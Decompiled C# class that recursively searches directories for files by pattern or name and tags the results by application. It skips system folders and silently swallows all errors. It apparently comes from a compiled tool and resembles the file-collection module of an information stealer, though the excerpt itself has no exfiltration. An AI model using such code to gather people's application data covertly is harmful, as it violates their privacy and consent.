using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000017 RID: 23
public static class FileScanning
{
	// Token: 0x06000097 RID: 151 RVA: 0x00007584 File Offset: 0x00005784
	public static List<ScannedFile> Search(params FileScanner[] scanners)
	{
		List<ScannedFile> list = new List<ScannedFile>();
		try
		{
			foreach (FileScanner fileScanner in scanners)
			{
				try
				{
					foreach (FileScannerArg fileScannerArg in fileScanner.GetScanArgs())
					{
						try
						{
							foreach (FileInfo fileInfo in new DirectoryInfo(fileScannerArg.Directory).GetFiles(fileScannerArg.Pattern, fileScannerArg.Recoursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly))
							{
								try
								{
									list.Add(new ScannedFile(fileInfo.FullName)
									{
										DirOfFile = fileScanner.GetFolder(fileScannerArg, fileInfo),
										NameOfApplication = (string.IsNullOrWhiteSpace(fileScanner.Name) ? fileScannerArg.Tag : fileScanner.Name)
									});
								}
								catch (Exception)
								{
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000098 RID: 152 RVA: 0x000076C0 File Offset: 0x000058C0
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>
		{
			"\\Windows\\",
			"\\Program Files\\",
			"\\Program Files (x86)\\",
			"\\Program Data\\"
		};
		List<string> list2 = new List<string>();
		if (files == null || files.Length == 0 || level > maxLevel)
		{
			return list2;
		}
		try
		{
			foreach (string text in Directory.GetDirectories(baseDirectory))
			{
				bool flag = false;
				foreach (string value in list)
				{
					if (text.Contains(value))
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag2 = false;
						int num = 0;
						while (num < files2.Length && !flag2)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag2)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag2 = true;
									list2.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in FileScanning.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list2.Contains(item))
							{
								list2.Add(item);
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list2;
	}
}
